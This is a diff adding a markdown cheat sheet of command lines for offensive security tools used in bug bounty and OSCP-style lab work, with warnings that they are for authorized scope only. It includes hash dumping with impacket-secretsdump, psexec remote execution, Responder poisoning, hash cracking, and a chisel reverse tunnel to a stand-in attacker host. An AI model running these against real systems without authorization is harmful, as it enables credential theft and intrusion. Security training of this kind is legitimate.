@@ -1,0 +1,258 @@
+# Bug Bounty & Red Team — Tools Command Reference (Part 2 — Advanced)
+
+> Continuation of Part 1. Covers XSS/param discovery, secrets scanning, API testing, cloud recon, request smuggling, SSTI/SSRF, screenshotting, hash cracking, and Active Directory / lateral movement tools (OSCP track).
+> ⚠️ AD/lateral-movement tools are for authorized labs (HTB, TryHackMe, home lab) — NOT for bug bounty targets unless explicitly in scope.
+
+---
+
+## 1. XSS Discovery
+
+### dalfox
+```bash
+dalfox url https://target.com/page?param=test
+dalfox file urls.txt -o dalfox_results.txt
+echo "https://target.com/page?q=test" | dalfox pipe
+```
+
+### XSStrike
+```bash
+python3 xsstrike.py -u "https://target.com/page?param=test"
+python3 xsstrike.py -u "https://target.com/page?param=test" --crawl
+```
+
+---
+
+## 2. Parameter Discovery
+
+### Arjun
+```bash
+arjun -u https://target.com/page
+arjun -u https://target.com/page -m POST
+arjun -i urls.txt -o params_found.txt
+```
+
+### ParamSpider
+```bash
+python3 paramspider.py -d target.com -o params.txt
+```
+
+### x8
+```bash
+x8 -u https://target.com/page -w wordlist.txt
+```
+
+---
+
+## 3. Secrets / Sensitive Data Scanning
+
+### TruffleHog
+```bash
+trufflehog git https://github.com/org/repo.git
+trufflehog filesystem /path/to/downloaded/repo
+```
+
+### Gitleaks
+```bash
+gitleaks detect --source /path/to/repo -v
+gitleaks detect --source . --report-path gitleaks_report.json
+```
+
+### git-dumper (recover exposed .git directories)
+```bash
+git-dumper https://target.com/.git/ output_folder/
+```
+
+### LinkFinder (JS file endpoint extraction)
+```bash
+python3 linkfinder.py -i https://target.com/app.js -o cli
+python3 linkfinder.py -i https://target.com -d -o results.html    # crawl + JS extraction
+```
+
+### SecretFinder
+```bash
+python3 SecretFinder.py -i https://target.com/main.js -o cli
+```
+
+---
+
+## 4. API Testing / Fuzzing
+
+### Kiterunner (API endpoint brute force)
+```bash
+kr scan https://target.com -w routes-large.kite -o api_results.txt
+```
+
+### feroxbuster (recursive content discovery, good for APIs)
+```bash
+feroxbuster -u https://target.com -w wordlist.txt -x json,xml
+```
+
+---
+
+## 5. CORS / Request Smuggling
+
+### CORScanner
+```bash
+python3 cors_scan.py -u https://target.com
+python3 cors_scan.py -i subs.txt -t 10
+```
+
+### Smuggler (HTTP request smuggling)
+```bash
+python3 smuggler.py -u https://target.com
+```
+
+---
+
+## 6. SSRF / SSTI
+
+### SSRFmap
+```bash
+python3 ssrfmap.py -r request.txt -p url -m portscan
+```
+
+### tplmap (Server-Side Template Injection)
+```bash
+python3 tplmap.py -u "https://target.com/page?name=test"
+```
+
+### Interactsh (out-of-band interaction, SSRF/blind vuln confirmation)
+```bash
+interactsh-client                    # generates a unique OOB domain to monitor callbacks
+```
+
+---
+
+## 7. Cloud Recon (AWS/GCP/Azure exposure)
+
+### S3Scanner
+```bash
+s3scanner scan --bucket-file buckets.txt
+```
+
+### cloud_enum
+```bash
+python3 cloud_enum.py -k targetcompany
+```
+
+### Prowler (AWS security audit — only if you have account access)
+```bash
+prowler aws
+```
+
+---
+
+## 8. Screenshotting (visual recon at scale)
+
+### gowitness
+```bash
+gowitness scan file -f live_hosts.txt
+gowitness report serve                # view results in browser
+```
+
+### EyeWitness
+```bash
+eyewitness --web -f live_hosts.txt -d output_folder
+```
+
+---
+
+## 9. Hash Cracking (heavier / GPU-based)
+
+### Hashcat
+```bash
+hashcat -m 0 -a 0 hash.txt rockyou.txt              # MD5
+hashcat -m 1000 -a 0 hash.txt rockyou.txt           # NTLM
+hashcat --show hash.txt
+```
+
+---
+
+## 10. Fast Port/Service Scanning (large scope)
+
+### Masscan
+```bash
+masscan -p1-65535 target.com --rate=1000 -oL masscan_out.txt
+```
+
+### RustScan
+```bash
+rustscan -a target.com -- -sV -sC
+```
+
+---
+
+## 11. Active Directory / Internal Network (OSCP track — lab only)
+
+### CrackMapExec / NetExec
+```bash
+netexec smb 192.168.x.x -u users.txt -p passwords.txt
+netexec smb 192.168.x.x -u admin -p 'password' --shares
+```
+
+### Impacket suite
+```bash
+impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass    # AS-REP roasting
+impacket-secretsdump domain/user:pass@192.168.x.x                    # dump hashes
+impacket-psexec domain/user:pass@192.168.x.x                         # remote exec
+```
+
+### BloodHound (AD attack path mapping)
+```bash
+bloodhound-python -u user -p pass -d domain.local -c all
+```
+
+### Responder (LLMNR/NBT-NS poisoning — lab only)
+```bash
+responder -I eth0 -wrf
+```
+
+---
+
+## 12. Privilege Escalation Enumeration
+
+### LinPEAS / WinPEAS
+```bash
+./linpeas.sh > linpeas_output.txt
+# WinPEAS run from target Windows shell
+winpeas.exe
+```
+
+---
+
+## 13. Pivoting / Tunneling
+
+### Chisel
+```bash
+# On attacker machine
+chisel server -p 8000 --reverse
+# On target
+chisel client attacker_ip:8000 R:socks
+```
+
+### ProxyChains
+```bash
+proxychains nmap -sT -Pn target_internal_ip
+```
+
+---
+
+## 14. Recon Automation Frameworks
+
+### reNgine
+```bash
+# Web UI based — install via docker, manage scans through browser dashboard
+```
+
+### Sn1per
+```bash
+sniper -t target.com -m normal
+```
+
+---
+
+## Notes
+
+- Part 2 tools are heavier/more invasive — verify scope + rules before running on any live bug bounty target
+- AD/lateral-movement section (11-13) is strictly for HTB/TryHackMe/home-lab practice, part of OSCP roadmap — not for bug bounty programs unless internal network testing is explicitly authorized
+- Cloud recon tools (S3Scanner, cloud_enum) — passive enumeration only unless you have explicit authorization for the cloud account
